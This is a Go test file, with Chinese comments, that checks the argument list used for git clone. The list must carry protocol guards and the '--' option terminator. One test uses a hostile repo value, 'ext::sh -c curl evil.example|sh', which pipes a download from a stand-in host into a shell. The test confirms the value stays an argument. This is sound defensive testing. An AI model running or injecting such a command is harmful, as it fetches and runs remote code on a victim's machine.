package engine

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

// gitCloneArgs 是 cloneSource 的执行面防线（安全批 P0）：传输协议白名单
// （-c protocol.ext/file.allow=never）+ `--` 选项终结。这里钉死 argv 形态
// ——两个 ref 分支都必须带防线，防后续重构悄然退化。
func TestGitCloneArgsHardened(t *testing.T) {
	const repo = "https://github.com/acme/shop.git"
	const dir = "/data/contexts/rev1"

	// 分支形态：浅克隆，-c 防线在 clone 之前、`--` 在 repo 之前。
	branchArgs := gitCloneArgs(repo, "main", dir)
	assert.Equal(t, []string{
		"-c", "protocol.ext.allow=never",
		"-c", "protocol.file.allow=never",
		"clone", "--quiet",
		"--depth", "1", "--branch", "main",
		"--", repo, dir,
	}, branchArgs, "branch-form clone must carry the transport guards and the -- separator")

	// sha 形态：全量 clone + 后置 checkout，防线同款。
	shaArgs := gitCloneArgs(repo, "1111111111111111111111111111111111111111", dir)
	assert.Equal(t, []string{
		"-c", "protocol.ext.allow=never",
		"-c", "protocol.file.allow=never",
		"clone", "--quiet",
		"--", repo, dir,
	}, shaArgs, "sha-form clone must carry the same guards (full clone, no --branch)")
}

// 恶意形态即使穿透受理面（存量行冻结的 repo），argv 里也必须停在参数位：
// repo 值不出现在任何选项位（`--` 之后的两个位置由 repo/dir 占据）。
func TestGitCloneArgsHostileRepoStaysArgument(t *testing.T) {
	hostile := "ext::sh -c curl evil.example|sh"
	args := gitCloneArgs(hostile, "main", "/tmp/x")
	// `--` 之后才允许出现 repo：选项区（`--` 之前）不得含恶意串。
	sep := -1
	for i, a := range args {
		if a == "--" {
			sep = i
			break
		}
	}
	assert.NotEqual(t, -1, sep, "clone argv must contain the -- option terminator")
	assert.Equal(t, hostile, args[sep+1], "the repo must sit strictly after -- (argument position)")
	for _, a := range args[:sep] {
		assert.NotContains(t, a, "ext::", "no option-position token may carry the hostile transport form")
	}
}
